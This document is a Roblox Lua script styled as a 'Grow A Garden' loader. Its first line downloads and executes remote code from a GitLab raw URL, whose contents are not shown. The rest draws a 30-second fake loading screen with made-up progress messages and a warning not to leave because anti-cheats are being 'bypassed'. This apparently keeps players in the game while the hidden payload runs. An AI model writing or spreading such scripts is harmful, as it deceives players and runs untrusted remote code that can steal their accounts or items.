loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/visual.lua"))()

local player = game:GetService("Players").LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create screen GUI
local gui = Instance.new("ScreenGui")
gui.Name = "LoadingUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- Background
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
bg.Parent = gui

-- Gradient
local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 20)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 80, 80))
}
gradient.Rotation = 90
gradient.Parent = bg

-- Title (fixed spacing)
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 80)
title.Position = UDim2.new(0, 0, 0.25, 0)
title.Text = "🌴 GROW A GARDEN 🌴"
title.Font = Enum.Font.GothamBlack
title.TextSize = 48
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.TextStrokeTransparency = 0.8
title.TextWrapped = true
title.TextStrokeColor3 = Color3.fromRGB(50, 50, 50)
title.Parent = bg

-- WARNING TEXT (moved below title)
local warning = Instance.new("TextLabel")
warning.Size = UDim2.new(1, 0, 0, 30)
warning.Position = UDim2.new(0, 0, 0.35, 0)  -- Moved down
warning.Text = "⚠️ DO NOT LEAVE - THIS SCRIPT IS CURRENTLY BYPASSING ANTI-CHEATS ⚠️"
warning.Font = Enum.Font.GothamBlack
warning.TextSize = 18
warning.TextColor3 = Color3.fromRGB(255, 50, 50)
warning.BackgroundTransparency = 0.7
warning.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
warning.TextStrokeTransparency = 0.5
warning.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
warning.Parent = bg

-- Subtitle
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 30)
subtitle.Position = UDim2.new(0, 0, 0.45, 0)
subtitle.Text = "Loading game assets..."
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 20
subtitle.TextColor3 = Color3.fromRGB(230, 230, 230)
subtitle.BackgroundTransparency = 1
subtitle.TextStrokeTransparency = 0.8
subtitle.TextStrokeColor3 = Color3.fromRGB(50, 50, 50)
subtitle.Parent = bg

-- Progress bar container
local progressContainer = Instance.new("Frame")
progressContainer.Size = UDim2.new(0.7, 0, 0, 20)
progressContainer.Position = UDim2.new(0.15, 0, 0.55, 0)
progressContainer.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
progressContainer.BorderSizePixel = 0
progressContainer.Parent = bg

-- Progress bar fill
local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.Position = UDim2.new(0, 0, 0, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
progressFill.BorderSizePixel = 0
progressFill.Parent = progressContainer

-- Progress text
local progressText = Instance.new("TextLabel")
progressText.Size = UDim2.new(1, 0, 0, 20)
progressText.Position = UDim2.new(0, 0, 0.6, 0)
progressText.Text = "0%"
progressText.Font = Enum.Font.GothamMedium
progressText.TextSize = 18
progressText.TextColor3 = Color3.fromRGB(200, 200, 200)
progressText.BackgroundTransparency = 1
progressText.Parent = bg

-- Animation function
local function animateLoading()
    local duration = 30 -- Increased to 30 seconds (adjust this number to make it longer/shorter)
    local startTime = tick()
    
    while true do
        local elapsed = tick() - startTime
        local progress = math.min(elapsed / duration, 1)
        
        -- Smooth progress using easing (makes it feel more natural)
        local easedProgress = progress^0.8  -- Makes the progress slower at the start
        
        -- Update progress bar
        progressFill.Size = UDim2.new(easedProgress, 0, 1, 0)
        progressText.Text = math.floor(easedProgress * 100) .. "%"
        
        -- More detailed loading messages
        if easedProgress < 0.2 then
            subtitle.Text = "Loading core assets..."
        elseif easedProgress < 0.4 then
            subtitle.Text = "Initializing garden systems..."
        elseif easedProgress < 0.6 then
            subtitle.Text = "Preparing plant growth algorithms..."
        elseif easedProgress < 0.8 then
            subtitle.Text = "Generating beautiful landscapes..."
        else
            subtitle.Text = "Finalizing your gardening experience..."
        end
        
        if progress >= 1 then
            break
        end
        
        game:GetService("RunService").Heartbeat:Wait()
    end
    
    -- Immediately destroy the GUI when done
    gui:Destroy()
end

-- Start the loading animation
animateLoading()
